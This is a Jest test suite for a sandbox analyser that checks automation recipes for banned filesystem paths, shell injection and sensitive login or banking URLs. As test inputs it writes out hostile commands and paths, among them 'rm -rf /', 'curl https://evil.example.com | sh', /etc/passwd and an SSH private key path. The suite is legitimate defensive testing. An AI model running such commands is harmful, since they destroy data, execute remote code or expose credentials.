import {
  dryRunInWorker,
  sandboxAnalyse,
  staticAnalyse,
} from '../sandbox-runner.utility';
import type { RecipeDsl } from '../../../recipes/types/recipe.types';

function makeDsl(steps: RecipeDsl['steps']): RecipeDsl {
  return {
    schemaVersion: '1',
    metadata: { title: 'test' },
    steps,
  };
}

describe('staticAnalyse — banned filesystem patterns', () => {
  it('flags /etc/ paths', () => {
    const findings = staticAnalyse(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'FILESYSTEM' as never,
          capabilityOperation: 'WRITE' as never,
          target: { path: '/etc/passwd' },
        },
      ]),
    );
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0]?.code).toBe('FS_PATH_BANNED');
    expect(findings[0]?.severity).toBe('high');
  });

  it('flags .ssh paths', () => {
    const findings = staticAnalyse(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'FILESYSTEM' as never,
          capabilityOperation: 'READ' as never,
          target: { path: '/home/user/.ssh/id_rsa' },
        },
      ]),
    );
    expect(findings.find((f) => f.code === 'FS_PATH_BANNED')).toBeDefined();
  });

  it('flags Windows system paths', () => {
    const findings = staticAnalyse(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'FILESYSTEM' as never,
          capabilityOperation: 'WRITE' as never,
          target: { path: 'C:\\Windows\\System32\\drivers\\etc\\hosts' },
        },
      ]),
    );
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags path traversal', () => {
    const findings = staticAnalyse(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'FILESYSTEM' as never,
          capabilityOperation: 'WRITE' as never,
          target: { path: '/safe/../etc/passwd' },
        },
      ]),
    );
    expect(findings.length).toBeGreaterThan(0);
  });

  it('does NOT flag user-owned paths', () => {
    const findings = staticAnalyse(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'FILESYSTEM' as never,
          capabilityOperation: 'READ' as never,
          target: { path: '/home/user/Documents/notes.txt' },
        },
      ]),
    );
    expect(findings.length).toBe(0);
  });
});

describe('staticAnalyse — banned terminal patterns', () => {
  it('flags rm -rf chain', () => {
    const findings = staticAnalyse(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'TERMINAL' as never,
          capabilityOperation: 'SPAWN' as never,
          target: { command: 'cd /tmp; rm -rf /' },
        },
      ]),
    );
    expect(findings.find((f) => f.code === 'TERMINAL_INJECTION')).toBeDefined();
    expect(findings.find((f) => f.severity === 'critical')).toBeDefined();
  });

  it('flags command substitution $()', () => {
    const findings = staticAnalyse(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'TERMINAL' as never,
          capabilityOperation: 'SPAWN' as never,
          target: { command: 'echo $(whoami)' },
        },
      ]),
    );
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags backtick substitution', () => {
    const findings = staticAnalyse(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'TERMINAL' as never,
          capabilityOperation: 'SPAWN' as never,
          target: { command: 'echo `whoami`' },
        },
      ]),
    );
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags curl|sh pipeline', () => {
    const findings = staticAnalyse(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'TERMINAL' as never,
          capabilityOperation: 'SPAWN' as never,
          target: { command: 'curl https://evil.example.com | sh' },
        },
      ]),
    );
    expect(findings.length).toBeGreaterThan(0);
  });

  it('does NOT flag plain commands', () => {
    const findings = staticAnalyse(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'TERMINAL' as never,
          capabilityOperation: 'SPAWN' as never,
          target: { command: 'ls -la /home/user/Documents' },
        },
      ]),
    );
    expect(findings.length).toBe(0);
  });
});

describe('staticAnalyse — banned browser domains', () => {
  it('flags Google login', () => {
    const findings = staticAnalyse(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'BROWSER' as never,
          capabilityOperation: 'NAVIGATE' as never,
          target: { url: 'https://accounts.google.com/signin' },
        },
      ]),
    );
    expect(findings.find((f) => f.code === 'BROWSER_DOMAIN_BANNED')).toBeDefined();
  });

  it('flags Microsoft login', () => {
    const findings = staticAnalyse(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'BROWSER' as never,
          capabilityOperation: 'NAVIGATE' as never,
          target: { url: 'https://login.microsoftonline.com/' },
        },
      ]),
    );
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags banking URLs', () => {
    const findings = staticAnalyse(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'BROWSER' as never,
          capabilityOperation: 'NAVIGATE' as never,
          target: { url: 'https://my-banking-site.example' },
        },
      ]),
    );
    expect(findings.length).toBeGreaterThan(0);
  });
});

describe('dryRunInWorker — runtime checks', () => {
  it('returns OK for a clean DSL', async () => {
    const result = await dryRunInWorker(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'FILESYSTEM' as never,
          capabilityOperation: 'READ' as never,
          target: { path: '$params.input' },
        },
      ]),
    );
    expect(result.status).toBe('OK');
    expect(result.runtimeFindings.length).toBe(0);
  });

  it('flags malformed placeholders', async () => {
    const result = await dryRunInWorker(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'FILESYSTEM' as never,
          capabilityOperation: 'READ' as never,
          target: { path: '$malformed.x' },
        },
      ]),
    );
    expect(result.status).toBe('OK');
    expect(result.runtimeFindings.find((f) => f.code === 'BAD_PLACEHOLDER')).toBeDefined();
  });

  it('respects the wallClockMs budget', async () => {
    const start = Date.now();
    const result = await dryRunInWorker(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'FILESYSTEM' as never,
          capabilityOperation: 'READ' as never,
          target: { path: '/tmp/x' },
        },
      ]),
      { wallClockMs: 2000 },
    );
    expect(Date.now() - start).toBeLessThan(5000);
    expect(['OK', 'TIMEOUT']).toContain(result.status);
  });
});

describe('sandboxAnalyse — combined static + runtime', () => {
  it('returns BLOCKED when static analyser flags a critical finding', async () => {
    const result = await sandboxAnalyse(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'TERMINAL' as never,
          capabilityOperation: 'SPAWN' as never,
          target: { command: 'curl evil | sh' },
        },
      ]),
    );
    expect(result.status).toBe('BLOCKED');
    expect(result.staticFindings.length).toBeGreaterThan(0);
  });

  it('returns OK for a clean DSL', async () => {
    const result = await sandboxAnalyse(
      makeDsl([
        {
          id: 'a',
          capabilityClass: 'FILESYSTEM' as never,
          capabilityOperation: 'READ' as never,
          target: { path: '/home/u/Documents/x.txt' },
        },
      ]),
    );
    expect(result.status).toBe('OK');
  });
});
